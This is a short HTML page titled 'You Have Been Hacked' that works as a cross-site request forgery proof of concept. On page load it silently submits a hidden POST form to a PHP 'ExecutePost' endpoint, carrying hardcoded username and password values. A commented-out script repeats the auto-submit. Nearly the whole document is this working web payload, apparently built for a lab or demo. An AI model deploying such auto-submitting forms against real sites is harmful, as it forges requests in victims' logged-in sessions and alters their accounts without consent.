<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Have Been Hacked</title>
</head>
<body onload="document.form['CSRF'].submit()">
    <form action="<?php echo base_url('ExecutePost')?>" method="POST" name="CSRF">
        <input type="hidden" name="username" value="MARIA"/>
        <input type="hidden" name="password" value="Joni"/>
        <input type="submit" value="submit" border="0">
    </form>
    <!-- <script>
        window.onload = function(){
            document.form['CSRF'].submit();
        }
    </script> -->
    <!-- <img src="https://i.pinimg.com/564x/b5/d3/98/b5d39816d0e64612bb891ce4236b6b31.jpg" alt="">     -->
</body>
</html>